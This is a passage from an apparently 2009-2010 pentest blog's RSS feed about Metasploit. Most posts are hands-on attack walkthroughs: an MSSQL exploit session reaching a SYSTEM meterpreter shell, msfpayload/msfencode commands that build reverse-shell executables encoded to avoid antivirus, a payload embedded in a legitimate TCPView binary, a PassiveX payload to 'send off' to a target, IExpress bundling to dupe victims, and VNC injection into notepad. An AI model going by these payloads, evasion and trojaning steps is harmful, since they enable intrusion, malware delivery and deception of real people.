PAYLOAD =&amp;gt; windows/meterpreter/reverse_https

msf exploit(mssql_payload) &amp;gt; set LHOST 10.10.10.59
LHOST =&amp;gt; 10.10.10.59

msf exploit(mssql_payload) &amp;gt; set RHOST 192.168.56.3
RHOST =&amp;gt; 192.168.56.3

msf exploit(mssql_payload) &amp;gt; set LPORT 443
LPORT =&amp;gt; 443

msf exploit(mssql_payload) &amp;gt; set PASSWORD SuperDuper#@rdP@$$w0rd2012
PASSWORD =&amp;gt; SuperDuper#@rdP@$$w0rd2012

msf exploit(mssql_payload) &amp;gt; exploit

[*] HTTPS listener started on https://10.10.10.59:443/
[*] Command Stager progress - 2.78% done (1494/53675 bytes)
[*] Command Stager progress - 5.57% done (2988/53675 bytes)
[*] Command Stager progress - 8.35% done (4482/53675 bytes)

&amp;lt;(editorial snip)&amp;gt;

[*] Command Stager progress - 94.64% done (50796/53675 bytes)
[*] Command Stager progress - 97.32% done (52235/53675 bytes)
[*] 192.168.56.3:1061 Request received for /AvlbV...
[*] 192.168.56.3:1061 Staging connection for target vlbV received...
[*] Patching Target ID vlbV into DLL
[*] 192.168.56.3:1062 Request received for /BvlbV...
[*] 192.168.56.3:1062 Stage connection for target vlbV received...

[*] Meterpreter session 2 opened (10.10.10.59:443 -&amp;gt; 192.168.56.3:1062) at Thu May 06 22:03:50 -0400 2010

[*] Exploit completed, but no session was created.
msf exploit(mssql_payload) &amp;gt; sessions -i 2
[*] Starting interaction with 2...

meterpreter &amp;gt; getuid
Server username: NT AUTHORITY\SYSTEM
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Game over..&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note: Routing only sends the module(be it exploit or aux) through the session. Once the payload runs (for exploit modules), it&amp;rsquo;s is calling straight back to the LHOST (Attacker box), not through the session. So, in this example you can now exit session 1 (NETWORK SERVICE) as it&amp;rsquo;s not really needed any more.&lt;/strong&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit Cyberwarfare</title>
      <link>https://malicious.link/post/2010/2010-04-01-metasploit-cyberwarfare/</link>
      <pubDate>Thu, 01 Apr 2010 16:32:52 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-04-01-metasploit-cyberwarfare/</guid>
      <description>&lt;p&gt;I&amp;rsquo;m not sure I will want to &lt;code&gt;svn up&lt;/code&gt; tomorrow. This Cyberwarfare version has advanced powers:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201004_aprilfools.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Meterpreter tunneling and VNC revamped</title>
      <link>https://malicious.link/post/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/</link>
      <pubDate>Tue, 15 Dec 2009 13:00:37 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/</guid>
      <description>

&lt;p&gt;So yesterday (December 14th, 2009) &lt;a href=&#34;http://twitter.com/hdmoore&#34;&gt;HD Moore&lt;/a&gt; posted &lt;a href=&#34;http://twitter.com/hdmoore/status/6663737357&#34;&gt;a tweet&lt;/a&gt; with a pic of the new VNC meterpreter script that he wrote:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/200912_vnc_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the script I noticed that it created a new connection (two connections outbound). Well it was the perfect excuse to take the newly refurbished portfwd command for a spin.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb&#34;&gt;https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Or you can get it via the SVN at &lt;a href=&#34;https://metasploit.com/redmine/projects/framework/repository/revisions/7872&#34;&gt;Revision 7872&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;By creating a bind payload instead of a reverse connect we can have the payload listen locally. Then with portfwd command (just like on your home router) we forward a local port to the local host on the remote side, to the binded port. Connecting to the freshly bound port as if we were actually doing everything on the box itself. Creating a new session and a nice beautiful VNC window.&lt;/p&gt;

&lt;h2 id=&#34;options&#34;&gt;Options:&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; run vnc_oneport -h

OPTIONS:  
-e &amp;lt;opt&amp;gt; The process to run and inject into (default: notepad.exe)  
-h  This help menu  
-l &amp;lt;opt&amp;gt; The local port to listen on via port forwarding (default: 5901)  
-p &amp;lt;opt&amp;gt; The port on the remote host to bind VNC to (default: randomized)

meterpreter &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;example-run&#34;&gt;Example Run:&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;[*] Meterpreter session 1 opened (192.168.92.103:4444 -&amp;gt; 192.168.92.113:1038)

meterpreter &amp;gt; **_run vnc_oneport_**
[*] Creating a VNC stager: RHOST=127.0.0.1 LPORT=1207
[*] Host process notepad.exe has PID 532
[*] Allocated memory at address 0x00640000
[*] Writing the VNC stager into memory...
[*] Running Payload
[*] Creating a new thread within notepad.exe to run the VNC stager...
[*] Starting the port forwarding from 5901 =&amp;gt; TARGET:1207
[*] Local TCP relay created: 0.0.0.0:5901 &amp;lt;-&amp;gt; 127.0.0.1:1207

meterpreter &amp;gt; [*] VNC Server session 2 opened (127.0.0.1:56893 -&amp;gt; 127.0.0.1:5901)
Connected to RFB server, using protocol version 3.3
No authentication needed
Desktop name &amp;quot;VNCShell [SYSTEM@WORKSTATION1] - Full Access&amp;quot;
VNC server default format:
32 bits per pixel.
Least significant byte first in each pixel.
	True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
	Using default colormap which is TrueColor.  Pixel format:
	32 bits per pixel.
Least significant byte first in each pixel.
	True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
	Using shared memory PutImage
Same machine: preferring raw encoding
ShmCleanup called
[*] VNC Server session 2 closed.
meterpreter &amp;gt;
[*] Meterpreter session 1 opened (192.168.92.103:4444 -&amp;gt; 192.168.92.113:1038)  
meterpreter &amp;gt; run vnc_oneport  
[*] Creating a VNC stager: RHOST=127.0.0.1 LPORT=1207  
[*] Host process notepad.exe has PID 532  
[*] Allocated memory at address 0x00640000  
[*] Writing the VNC stager into memory...  
[*] Running Payload  
[*] Creating a new thread within notepad.exe to run the VNC stager...  
[*] Starting the port forwarding from 5901 =&amp;gt; TARGET:1207  
[*] Local TCP relay created: 0.0.0.0:5901 &amp;lt;-&amp;gt; 127.0.0.1:1207  
meterpreter &amp;gt; [*] VNC Server session 2 opened (127.0.0.1:56893 -&amp;gt; 127.0.0.1:5901)  
Connected to RFB server, using protocol version 3.3  
No authentication needed  
Desktop name &amp;quot;VNCShell [SYSTEM@WORKSTATION1] - Full Access&amp;quot;VNC server default format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0  
Using default colormap which is TrueColor.  Pixel format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0  
Using shared memory PutImageSame machine: preferring raw encodingShmCleanup called  
[*] VNC Server session 2 closed.

meterpreter &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;note&#34;&gt;Note:&lt;/h2&gt;

&lt;p&gt;The forwarded port does not close even if the meterpreter session is ended, so use the following command to close the forward:&lt;/p&gt;

&lt;p&gt;```
meterpreter &amp;gt; portfwd delete -l 5901&lt;br /&gt;
[*] Successfully stopped TCP relay on 0.0.0.0:5901
meterpreter &amp;gt;&lt;/p&gt;

&lt;p&gt;(Note to BT4 users: do a &lt;code&gt;apt-get install vncviewer&lt;/code&gt; before using any of the vnc payloads in Metasploit)&lt;/p&gt;

&lt;p&gt;The script utilizes just one of the millions of way you can leverage &amp;lsquo;portfwd&amp;rsquo; in your endeavors. But where it gets interesting is the fact that the delivery method for the payload never touches disk. That magic is all credited to HD though. What happens is a new process is created (notepad by default) and the newly created VNC bind payload is injected into it. But, the beauty is that it&amp;rsquo;s doing local connections via the port forwarding so all you see in TCPView is:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/200912_vnc_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Now it&amp;rsquo;s definitely suspicious that Notepad has any connections at all, but you can use the option &lt;code&gt;-e&lt;/code&gt; to provide any executable you wish, as long as it&amp;rsquo;s in the path for the system. For examples, look at what&amp;rsquo;s running naturally already.&lt;/p&gt;

&lt;p&gt;Plus, you would probably not be using port 4444 for a meterpreter session. But what I wanted to demonstrate with this script is the power of both meterpreter, and port forwarding.&lt;/p&gt;

&lt;p&gt;Now it&amp;rsquo;s your turn to make it better. Take a look at the guts, see if anything will help you in your scripting.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit with Ruby 1.9.1</title>
      <link>https://malicious.link/post/2009/2009-12-09-metasploit-with-ruby-191/</link>
      <pubDate>Wed, 09 Dec 2009 13:09:00 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-12-09-metasploit-with-ruby-191/</guid>
      <description>&lt;p&gt;UPDATE: if you don&amp;rsquo;t make some additional steps, the &amp;lsquo;rvm 1.9.1&amp;rsquo; command only is active for the current console session. See the site for details: &lt;a href=&#34;http://rvm.beginrescueend.com/&#34;&gt;http://rvm.beginrescueend.com/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This short tutorial is how to get Ruby 1.9.1 on BT4 or any other Linux distro with the tool &amp;lsquo;rvm&amp;rsquo; (Ruby Version Manager).&lt;/p&gt;

&lt;p&gt;The Metasploit team has put a lot of work into getting the framework to work well with 1.9.1 and still work with earlier versions. Here is a way that you can try out the new hotness, or just test to see if all of the tweaks and modules you run, work with the newer version of ruby.&lt;/p&gt;

&lt;p&gt;&lt;iframe src=&#34;//player.vimeo.com/video/8069236&#34; width=&#34;500&#34; height=&#34;375&#34; frameborder=&#34;0&#34; webkitallowfullscreen mozallowfullscreen allowfullscreen&gt;&lt;/iframe&gt; &lt;p&gt;&lt;a href=&#34;http://vimeo.com/8069236&#34;&gt;Metasploit with Ruby 1.9.1&lt;/a&gt; from &lt;a href=&#34;http://vimeo.com/mubix&#34;&gt;mubix&lt;/a&gt; on &lt;a href=&#34;https://vimeo.com&#34;&gt;Vimeo&lt;/a&gt;.&lt;/p&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2009-12-10 14:19 by Rob Fuller&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve replaced my video with a short shell script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash

gem install rvm
rvm-install
rvm install 1.9.1
rvm 1.9.1
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit Blends in: New MSFPayload/ENcode</title>
      <link>https://malicious.link/post/2009/2009-11-03-metasploit-blends-in-new-msfpayloadencode/</link>
      <pubDate>Tue, 03 Nov 2009 03:47:20 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-11-03-metasploit-blends-in-new-msfpayloadencode/</guid>
      <description>&lt;p&gt;In &lt;a href=&#34;https://metasploit.com/redmine/projects/framework/repository/revisions/7315&#34;&gt;Revision 7315&lt;/a&gt; of the Metasploit Framework (SVN) a new option was added to MSFENCODE. Technically you always had the ability to do the following, but it required a bit of knowledge of the inner workings of the framework.&lt;/p&gt;

&lt;p&gt;But before I get into the new feature, lets quickly go over the standard way you use msfencode:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.131 LPORT=443 R | ./msfencode -t exe -o /tmp/bob.exe       
[*] x86/shikata_ga_nai succeeded with size 318 (iteration=1) 

root@bt4:/pentest/exploits/framework3#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We just used MSFPAYLOAD to output in [R]AW format, a reverse tcp connect meterpreter payload. We then piped it into MSFENCODE, so that we could output it as a proper Windows executable (/tmp/bob.exe), encoded to avoid AV detection.&lt;/p&gt;

&lt;p&gt;Now if you knew where it was (data/templates/template.exe) you could probably just replace the template.exe with the one you want loaded with the payload and called it a day. But then you wouldnât get some of the tweaks that make this update awesome.&lt;/p&gt;

&lt;p&gt;The update added the (-x) option to msfencode. This allows you to specify an executable of your choosing to sacrifice to the gods. For example: (TCPView)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.131 LPORT=443       
R | ./msfencode -t exe -x /tmp/Tcpview.exe -o /tmp/Tcpview2.exe        
[*] x86/shikata_ga_nai succeeded with size 318 (iteration=1) 

root@bt4:/pentest/exploits/framework3#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And if everything went well, we have a nice new executable in /tmp/ called Tcpview2.exe. Want to know the magic part? Try to tell them apart:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/200911_msfencode_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Packet Captures with Meterpreter - 7zip - WinDump - and Nmap-ish</title>
      <link>https://malicious.link/post/2009/2009-10-03-packet-captures-with-meterpreter-7zip-windump-and-nmap-ish/</link>
      <pubDate>Sat, 03 Oct 2009 02:24:05 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-10-03-packet-captures-with-meterpreter-7zip-windump-and-nmap-ish/</guid>
      <description>&lt;p&gt;So this is a pretty crafty way of getting packet captures on a target system. Definitely could be streamlined with some meterpreter scripting fu, but awesome job on the video.&lt;/p&gt;

&lt;p&gt;&lt;iframe src=&#34;//player.vimeo.com/video/6830384&#34; width=&#34;500&#34; height=&#34;375&#34; frameborder=&#34;0&#34; webkitallowfullscreen mozallowfullscreen allowfullscreen&gt;&lt;/iframe&gt; &lt;p&gt;&lt;a href=&#34;http://vimeo.com/6830384&#34;&gt;Metasploit meterpreter Windump/Winpcap sniffer&lt;/a&gt; from &lt;a href=&#34;http://vimeo.com/siles&#34;&gt;siles&lt;/a&gt; on &lt;a href=&#34;https://vimeo.com&#34;&gt;Vimeo&lt;/a&gt;.&lt;/p&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit Framework as a Payload</title>
      <link>https://malicious.link/post/2009/2009-06-26-metasploit-framework-as-a-payload/</link>
      <pubDate>Fri, 26 Jun 2009 05:45:08 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-06-26-metasploit-framework-as-a-payload/</guid>
      <description>&lt;p&gt;Well, sortaâ¦&lt;/p&gt;

&lt;p&gt;I created a meterpreter script that takes the cygwin bundled version of Metasploit inside of a NullSoft installer that HD Moore created and deploys it using meterpreter to the compromised host, extracts/installs it, and runs the shell. Now I left this intentionally open so that you could package your own cygwin bundle (possibly with nmap and netcat), for your own evil fun.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Thanks defintely go to Carlos Perez (Dark0perator) and HD Moore for their help getting this bad boy working right.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;You can download the script here: &lt;a href=&#34;https://github.com/mubix/stuff/blob/master/metasploit/deploymsf.rb&#34;&gt;https://github.com/mubix/stuff/blob/master/metasploit/deploymsf.rb&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can download the cygwin installs from the metasploit website:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;13mb FULL framework: &lt;a href=&#34;https://github.com/mubix/stuff/blob/master/w32bins/metasploit_installers/framework-3.3-dev.exe?raw=true&#34;&gt;framework-3.3-dev.exe&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;5mb MINI (just msfconsole): &lt;a href=&#34;https://github.com/mubix/stuff/blob/master/w32bins/metasploit_installers/mini-3.3-dev.exe?raw=true&#34;&gt;mini-3.3-dev.exe&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And here is what it looks like:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; run deploymsf -f framework-3.3-dev.exe  
[*] Running Meterpreter MSFp Deploytment Script.....  
[*] Uploading MSFp for for deployment....  
[*] MSFp uploaded as C:DOCUME~1mubixLOCALS~1Temp12681.exe  
[*] Installing MSFp...........  
[*] Done!  
[*] Installation Complete!  
[*] Running cygwin shell channelized...  
[*] Channel 18 created - Type: interact 18 to play  
[*] Be warned, it takes a bit for post setup to happen  
[*] and you will not see a prompt, try pwd to check  
meterpreter &amp;gt; interact 18  
Interacting with channel 18...  
  
[*] Configuring multi-user permissions for first run...  
[*] Configuring the initial user environment...  
pwd  
/home/mubix  
ls  
msfconsole  
*** Metasploit only has EXPERIMENTAL support for Ruby 1.9.1 and newer, things may break!  
*** Please report bugs to msfdev[at]metasploit.com  
[-] ***  
[-] * WARNING: No database support: LoadError no such file to load -- active_record  
[-] ***  
  
## ### ## ##  
## ## #### ###### #### ##### ##### ## #### ######  
####### ## ## ## ## ## ## ## ## ## ## ### ##  
####### ###### ## ##### #### ## ## ## ## ## ## ##  
## # ## ## ## ## ## ## ##### ## ## ## ## ##  
## ## #### ### ##### ##### ## #### #### #### ###  
##  
  
=[ msf v3.3-dev  
+ -- --=[ 379 exploits - 231 payloads  
+ -- --=[ 20 encoders - 7 nops  
=[ 156 aux  
  
msf &amp;gt;GAME OVER
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>PassiveX fun with Metasploit</title>
      <link>https://malicious.link/post/2009/2009-06-10-passivex-fun-with-metasploit/</link>
      <pubDate>Wed, 10 Jun 2009 13:21:05 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-06-10-passivex-fun-with-metasploit/</guid>
      <description>&lt;p&gt;I posted this walkthrough to the Metasploit mailing list, but thought that it would serve well here as well. Especially with the recent iPhone 3.0 âSpecialâ download spam I recently received. The binary comes out to a whopping 97 bytes for the stager. Would be a blazing fast download and coupled with the &lt;a href=&#34;https://malicious.link/archives/440-metasploit-2.html&#34;&gt;IExpress âhackâ&lt;/a&gt; would make for an very hard to spot payload.&lt;/p&gt;

&lt;p&gt;A really down and dirty explination of what PassiveX is and why it&amp;rsquo;s useful in this sort of situation is that instead of making a direct connection back to you, it uses an iexplorer process with a cool ActiveX control to talk back. So someone looking for a rogue process will only see Internet Explorer open and talking over port 443 (as specified).&lt;/p&gt;

&lt;p&gt;(props to skape for writting PassiveX and @&lt;a href=&#34;https://twitter.com/natronkeltner&#34;&gt;NatronKeltner&lt;/a&gt; for kicking in the latest tweaks to make it work with IE7/IE8)&lt;/p&gt;

&lt;p&gt;Here are the options for msfpayload:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Usage: ./msfpayload &amp;lt;payload&amp;gt; [var=val] &amp;lt;S[ummary]|C|P[erl]|[Rub]y|R[aw]|J[avascript]|e[X]ecutable|[V]BA&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And msfencode&amp;rsquo;s options if you chose to use it as I demonstrate below. However, encoding happens by default with msfpayload (IIRC):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;./msfencode -h
Usage: ./msfencode &amp;lt;options&amp;gt;
OPTIONS:
-a &amp;lt;opt&amp;gt; The architecture to encode as     
-b &amp;lt;opt&amp;gt; The list of characters to avoid: &#39;x00xff&#39;      
-c &amp;lt;opt&amp;gt; The number of times to encode the data      
-e &amp;lt;opt&amp;gt; The encoder to use      
-h Help banner      
-i &amp;lt;opt&amp;gt; Encode the contents of the supplied file path      
-l List available encoders      
-m &amp;lt;opt&amp;gt; Specifies an additional module search path      
-n Dump encoder information      
-o &amp;lt;opt&amp;gt; The output file      
-s &amp;lt;opt&amp;gt; The maximum size of the encoded data      
-t &amp;lt;opt&amp;gt; The format to display the encoded buffer with (c, elf, exe, java, perl, raw, ruby, vba)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here we create the PassiveX payload. Note the PX options instead of the LHOST/LPORT:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;./msfpayload windows/reflectivemeterpreter/reverse_http PXHOST=192.168.1.100 PXPORT=443 PXURI=/ R | ./msfencode -t exe -o /tmp/maliciouspayload.exe
[*] x86/shikata_ga_nai succeeded with size 97 (iteration=1)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now that we have our &amp;ldquo;malicious payload&amp;rdquo; in /tmp we get our listener ready (you can use msfcli as well, I just like msfconsole because it provides me more flexibility):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;./msfconsole

 

_     
| | o      
_ _ _ _ _|_ __, , _ | | __ _|_      
/ |/ |/ | |/ | / | / _|/ _|/ / _| |      
| | |_/|__/|_/_/|_/ / |__/ |__/__/ |_/|_/      
/|      
|

 

=[ msf v3.3-dev     
+ -- --=[ 376 exploits - 234 payloads      
+ -- --=[ 20 encoders - 7 nops      
=[ 153 aux

 

msf &amp;gt; use multi/handler     
msf exploit(handler) &amp;gt; exploit -h
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;(I&amp;rsquo;m showing you &amp;lsquo;exploit&amp;rsquo;s options because a lot of people don&amp;rsquo;t know they exist. With two lines you can start your listener (use, then exploit):**&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Usage: exploit [options]     
Launches an exploitation attempt.

OPTIONS:     
-e &amp;lt;opt&amp;gt; The payload encoder to use. If none is specified, ENCODER is used.      
-h Help banner.      
-j Run in the context of a job.      
-n &amp;lt;opt&amp;gt; The NOP generator to use. If none is specified, NOP is used.      
-o &amp;lt;opt&amp;gt; A comma separated list of options in VAR=VAL format.      
-p &amp;lt;opt&amp;gt; The payload to use. If none is specified, PAYLOAD is used.      
-t &amp;lt;opt&amp;gt; The target index to use. If none is specified, TARGET is used.      
-z Do not interact with the session after successful exploitation.

msf exploit(handler) &amp;gt; exploit -j -z -p windows/reflectivemeterpreter/reverse_http -o PXHOST=0.0.0.0,PXPORT=443,PXURI=/,ExitOnSession=False

[*] Exploit running as background job.     
[*] PassiveX listener started.      
[*] Starting the payload handler...

 msf exploit(handler) &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Listener ready to go. I chose IP: 0.0.0.0 just to make things easy. Just send off maliciouspayload.exe to your target and you&amp;rsquo;re set.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit &lt;3s Microsoft</title>
      <link>https://malicious.link/post/2009/2009-03-09-metasploit-3s-microsoft/</link>
      <pubDate>Mon, 09 Mar 2009 22:03:27 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-03-09-metasploit-3s-microsoft/</guid>
      <description>&lt;p&gt;Update to post: &lt;a href=&#34;https://malicious.link/blog/2009/03/02/metasploit-hearts-microsoft/&#34;&gt;Metasploit Heart&amp;rsquo;s Microsoft&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ok, so many people had issues with the Vimeo video, that I posted it to youtube in hopes that you&amp;rsquo;ll be able to play it all the way through. I still have no idea what the issue is, it&amp;rsquo;s played perfectly on all the computers that I&amp;rsquo;ve tried it on.&lt;/p&gt;

&lt;iframe width=&#34;420&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/6hB8GrTvyEU&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit heart&#39;s Microsoft</title>
      <link>https://malicious.link/post/2009/2009-03-02-metasploit-hearts-microsoft/</link>
      <pubDate>Mon, 02 Mar 2009 19:24:23 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-03-02-metasploit-hearts-microsoft/</guid>
      <description>&lt;p&gt;&lt;iframe src=&#34;//player.vimeo.com/video/3440084&#34; width=&#34;500&#34; height=&#34;361&#34; frameborder=&#34;0&#34; webkitallowfullscreen mozallowfullscreen allowfullscreen&gt;&lt;/iframe&gt; &lt;p&gt;&lt;a href=&#34;http://vimeo.com/3440084&#34;&gt;Hiding Meterpreter with IExpress&lt;/a&gt; from &lt;a href=&#34;http://vimeo.com/mubix&#34;&gt;mubix&lt;/a&gt; on &lt;a href=&#34;https://vimeo.com&#34;&gt;Vimeo&lt;/a&gt;.&lt;/p&gt;&lt;/p&gt;

&lt;p&gt;Using the IExpress, a built in tool (XP, not sure about other Windows versions), we package two executables together, so that the target is less likely to suspect foul play. Now, I used calc.exe, but you can use anything on both sides of the coin. Use a better game so that it&amp;rsquo;s easyier to dupe, or a different malicious executable (leekspin perhaps?).&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ll let your minds take this to the level I know you all are capable of. One caveat is that the icon for the executable is that of the self extractor, which shouldn&amp;rsquo;t be that much of an issue to change, but I don&amp;rsquo;t know off the top of my head of an app that does it, so please comment and let me know if you do.&lt;/p&gt;

&lt;p&gt;Commands from video:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=1080 X &amp;gt; /tmp/academy/bob.exe&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;(For python 2.4+) python -m SimpleHTTPServer&lt;/li&gt;
&lt;li&gt;(For python 2.3 -)Â python -c &amp;ldquo;from SimpleHTTPServer import test; test()&amp;rdquo;&lt;/li&gt;
&lt;li&gt;Start -&amp;gt; Run -&amp;gt; iexpress &lt;return&gt;&lt;/li&gt;
&lt;li&gt;Run multi/hander from command line (not shown in video)
&lt;br /&gt;
&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Links from video:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.metasploit.com/&#34;&gt;http://www.metasploit.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.shell-fu.org/&#34;&gt;http://www.shell-fu.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.microsoft.com/technet/prodtechnol/ie/ieak/techinfo/deploy/60/en/iexpress.mspx?mfr=true&#34;&gt;http://www.microsoft.com/technet/prodtechnol/ie/ieak/techinfo/deploy/60/en/iexpress.mspx?mfr=true&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.virustotal.com/&#34;&gt;http://www.virustotal.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.theacademypro.com/&#34;&gt;http://www.theacademypro.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.theacademyhome.com/&#34;&gt;http://www.theacademyhome.com/&lt;/a&gt;
&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit Across the Net</title>
      <link>https://malicious.link/post/2009/2009-02-04-metasploit-across-the-net/</link>
      <pubDate>Wed, 04 Feb 2009 18:13:00 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-02-04-metasploit-across-the-net/</guid>
      <description>&lt;p&gt;Metasploit is awesome, but some donât know that their are updates all the time via SVN, and even fewer know of places to get good non-svn modules / scripts. Here are a few of my favorites:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.securinfos.info/metasploit/msfxdc.php&#34;&gt;https://www.securinfos.info/metasploit/msfxdc.php&lt;/a&gt;&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://metasploit.com/users/mc/&#34;&gt;http://metasploit.com/users/mc/&lt;/a&gt;&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://darkoperator.blogspot.com&#34;&gt;http://darkoperator.blogspot.com&lt;/a&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&amp;ndash; newly added, check out the CookieMonster script and a host of others:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://pentest.cryptocity.net&#34;&gt;http://pentest.cryptocity.net&lt;/a&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And of course: &lt;a href=&#34;http://carnal0wnage.blogspot.com/&#34;&gt;http://carnal0wnage.blogspot.com/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>
